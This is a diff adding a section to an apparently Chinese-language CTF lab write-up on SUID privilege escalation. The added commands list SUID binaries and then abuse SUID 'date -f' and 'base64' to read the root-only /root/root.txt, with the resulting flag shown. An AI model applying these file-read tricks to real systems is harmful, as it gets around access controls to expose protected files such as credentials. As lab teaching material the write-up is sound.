@@ -104,3 +104,36 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ## SUID 提权
+-   查找 SUID 可执行文件:
+
+```bash
+welcome@dmsy-awd:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/date
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/base64
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+```
+-  发现 data 和 base64 有 SUID 权限 
+
+```bash
+welcome@dmsy-awd:~$ LFILE=/root/root.txt
+welcome@dmsy-awd:~$ date -f $LFILE
+date: invalid date ‘flag{1998cbf9-1f88-11f0-a369-000c29094b2d}’
+
+welcome@dmsy-awd:~$ base64 "$LFILE" | base64 -d
+flag{1998cbf9-1f88-11f0-a369-000c29094b2d}
+```
+
+## 彩蛋
